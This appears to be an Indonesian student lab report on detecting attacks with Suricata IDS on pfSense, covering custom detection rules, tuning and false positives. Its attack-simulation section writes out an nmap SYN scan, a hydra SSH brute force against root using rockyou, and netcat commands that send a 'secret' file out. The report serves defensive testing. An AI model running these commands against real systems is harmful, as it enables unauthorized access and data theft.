# Deteksi Serangan Menggunakan IDS Suricata

### Anggota Kelompok 9 
| No | Nama                                        | NRP         |
|----|---------------------------------------------|-------------|
| 1  | Mohammad Abyan Ranuaji                      | 5027241106  |
| 2  | Erlinda Annisa Zahra                        | 5027241108  |
| 3  | Yasykur Khalis Jati Maulana Yuwono          | 5027241112  |
| 4  | Zahra Hafizhah                              | 5027241121  |



### Posisi IDS dan Alasan
IDS dipasang di pfSense dengan beberapa alasan :
1. Semua trafik lintas subnet lewat pfSense
2. Tidak perlu memasang IDS di setiap subnet (hemat resource)
3. Bisa menangkap Nmap SYN scan, SSH brute force, HTTP file transfer

### Konfigurasi
IDS ditempatkan pada pdSense1, memanfaatkan kemampuan inline untuk memantau lalu lintas pada titik kritis jaringan
|Interface | IP Address            | Keterangan Jaringan             | 
| em1      | 10.20.254.2/30        | Menghubungkan ke EdgeRouter     |
| em3      | 10.20.100.1/30        | Menghubungkan ke RouteEksternal |
| em2      | 10.20.200.1/30        | Menghubungkan ke RouterInternal |

Variabel lingkungan didefinisikan untuk membedakan secara jelas antara jaringan internal yang dilindungi ($HOME\_NET$) dan jaringan eksternal ($EXTERNAL\_NET$)
| Variabel       | Definisi                                                                                       | 
| HOME_NET       | 10.20.10.0/24, 10.20.20.0/24, 10.20.30.0/24, 10.20.40.0/24, 10.20.50.0/24                      | 
| EXTERNAL_NET   | !$HOME_NET (atau any jika diimplementasi sebagai interface WAN)                                | 
| $DNS\_SERVERS$ | Diset ke IP DNS Internal/Eksternal yang digunakan (misalnya 8.8.8.8, 1.1.1.1 atau IP internal) | 
### Custome Rules
a. Rule Port Scanning
Subnet Mahasiswa = 10.20.10.0/24
Target = Subnet Riset 10.20.30.0/24
RULE
```
alert tcp 10.20.10.0/24 any -> 10.20.30.0/24 any (flags: S; msg:"[IDS] Possible SYN Scan from Mahasiswa"; threshold: type both, track by_src, count 10, seconds 5; sid:100001; rev:1;)
```
b. Rule SSH Brute Force
SSH Server Riset = 10.20.30.10 Port 22
RULE 
```
alert tcp 10.20.10.0/24 any -> 10.20.30.10 22 (msg:"[IDS] SSH Brute Force Attempt"; flags:S; threshold:type both, track by_src, count 5, seconds 10; sid:100002; rev:1;)
```
c. Rule Data Exfiltration via HTTP 
File < 2 KB dari Riset ke Mahasiswa via HTTP GET
RULE
```
alert http 10.20.30.10 any -> 10.20.10.0/24 any (msg:"[IDS] Suspicious Small HTTP File Exfiltration"; file_data; content:"HTTP/1.1 200"; http_header; dsize:<2000; sid:100003; rev:1;)
```

### Simulasi Serangan
a. Simulasi SYN Scan
Dari PC MAhasiswa

b. Network Scanning (Nmap Scan)
```
nmap -sS -p- <IP_TARGET>
```

Suricata berhasil mendeteksi aktivitas scanning dan menghasilkan alert dengan kategori “SCAN”/“PORTSCAN”. Ini menandakan IDS mampu mengidentifikasi upaya pemindaian port yang umum digunakan untuk reconnaissance.

c. SSH Brute Force
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP_TARGET>
```

Suricata berhasil mendeteksi aktivitas brute force terhadap layanan SSH dan menampilkan alert terkait upaya login berulang. Hal ini membuktikan IDS mampu mengidentifikasi perilaku autentikasi yang mencurigakan.

d. Data Exfiltration (Transfer File Besar via Netcat)

Receiver:
```
nc -lvp 4444 > file_terima.txt
```

Sender:
```
nc <IP_TARGET> 4444 < file_rahasia.txt
```

Suricata menampilkan alert terkait transfer data dalam jumlah besar, menunjukkan bahwa IDS mampu mengidentifikasi pola exfiltration sederhana melalui kanal TCP biasa.
### Analisis Singkat

**Serangan Yang Paling Mudah Terdeteksi**

Serangan yang paling mudah dideteksi oleh Suricata adalah network scanning (Nmap scan). Hal ini karena pola port scanning sangat khas dan memiliki signature yang jelas, seperti banyaknya koneksi SYN ke berbagai port dalam waktu singkat. Suricata memiliki rule bawaan yang secara spesifik ditujukan untuk mendeteksi scan, sehingga alert langsung muncul tanpa konfigurasi tambahan.

**Adanya False Positive**

Selama pengujian, potensi false positive muncul terutama pada serangan brute force. Ketika dilakukan koneksi SSH berulang kali, Suricata mendeteksinya sebagai brute force meskipun sebagian percobaan sebenarnya hanya berupa koneksi normal (misal gagal login karena salah ketik password). Selain itu, beberapa rule informasi (INFO alert) juga muncul meskipun tidak terkait serangan nyata. Hal ini wajar karena IDS berbasis signature dapat mendeteksi pola yang mirip serangan, walaupun dalam beberapa kasus aktivitas tersebut masih normal.

**Hal yang perlu Ditingkatkan**
Beberapa perbaikan yang dapat diterapkan:

1. Penyesuaian Ruleset
Menonaktifkan rule yang terlalu sensitif atau tidak relevan dengan lingkungan jaringan agar jumlah false positive berkurang.

2. Menambahkan Custom Rules
Custom rule yang lebih spesifik terhadap pola trafik di jaringan sendiri akan meningkatkan akurasi deteksi.

3. Penerapan Thresholding dan Suppression
Menambahkan threshold untuk event tertentu (misal SSH login) agar IDS tidak menganggap semua kegagalan login sebagai brute force.

4. Integrasi dengan SIEM atau Alert Dashboard
Agar analisis lebih mudah dan korelasi antar alert lebih jelas.

5. Penyesuaian Performance (Tuning Suricata)
Mengaktifkan multithreading dan memaksimalkan CPU cores supaya IDS tidak drop packet ketika trafik tinggi.


### Kesimpulan

Berdasarkan pengujian yang dilakukan, Suricata berhasil mendeteksi seluruh jenis serangan yang disimulasikan, yaitu port scanning, brute force SSH, dan exfiltration traffic. Rule bawaan Suricata mampu mendeteksi scan dengan sangat cepat, sementara custom rules membantu memperjelas pola brute force dan transfer data mencurigakan. Meskipun terdapat beberapa potensi false positive, secara keseluruhan IDS berjalan efektif dan memberikan alert yang akurat. Dengan tuning rule dan threshold yang lebih baik, sistem dapat menjadi lebih presisi dan optimal untuk digunakan sebagai IDS dalam lingkungan jaringan.
